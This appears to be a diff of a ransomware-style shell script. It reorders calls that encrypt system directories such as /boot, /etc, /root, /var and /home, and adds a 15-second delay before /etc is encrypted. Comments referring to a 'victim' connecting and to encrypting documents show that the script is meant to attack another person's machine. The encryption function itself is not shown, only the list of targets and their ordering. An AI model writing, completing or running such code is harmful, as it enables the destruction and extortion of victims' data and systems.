@@ -26,10 +26,11 @@ sleep 5 # let the victim connect
 encrypt_file "$HOME/testing.txt"
 
 encrypt_file "/boot"
-encrypt_file "/etc"
 encrypt_file "/root"
 encrypt_file "/run"
 encrypt_file "/var"
+sleep 15
+encrypt_file "/etc"
 encrypt_file "/home"
 
 # # Encrypt documents
